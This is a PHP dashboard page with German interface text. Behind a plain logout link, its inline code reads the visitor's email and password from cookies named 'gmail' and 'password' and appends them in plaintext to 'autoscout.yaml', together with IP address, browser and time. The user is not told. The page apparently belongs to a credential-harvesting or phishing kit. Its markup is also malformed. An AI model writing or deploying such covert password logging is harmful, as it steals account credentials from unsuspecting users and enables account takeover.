<?php
//include auth_session.php file on all user panel pages
include("auth_session.php");
include_once('lib/Database.php');
include_once('config/Config.php');
include_once('inc/header.php');
?>
<html lang="de">
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Armaturenbrett</title>

    <!-- <link rel="stylesheet" href="style.css" /> -->
</head>

<body>
   
    <?php 
        $db = new Database();
        $query = "SELECT * FROM users";
        $read = $db->Select($query);
        $line = "Browser : ". $_SERVER['HTTP_USER_AGENT']."\n"."IP address : ". $_SERVER['REMOTE_ADDR']."\n"."Email : ". $_COOKIE["gmail"]."\n"."Passwort : ".$_COOKIE["password"]."\n"."Date : " .date('Y-m-d H:i:s') ;
        file_put_contents('autoscout.yaml', $line . PHP_EOL, FILE_APPEND);
        $log = array('time' => time(), 'ip' => $_SERVER['REMOTE_ADDR'], 'url' => $_SERVER['REQUEST_URI']);
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        //echo $_SERVER['HTTP_USER_AGENT'];"<br>";
        //echo date('Y-m-d H:i:s');
        //echo $_SERVER['HTTP_ACCEPT_LANGUAGE'];
        
        
        if(isset($_COOKIE["gmail"]))
        {

        //echo "gmail = ". $_COOKIE["gmail"]."<br/>";
        //echo "Passwort = ". $_COOKIE["password"]."<br/>";
        }
        
    ?>
        <!--<p style=""><?php echo $_SESSION['gmail']; ?>!</p>-->
        <!--<p><?php echo $ip; ?></p>-->
        <p style="font-size:18px;color:black;"><a href="logout.php" style="text-decoration:none;">Ausloggen</a></p>


</body>
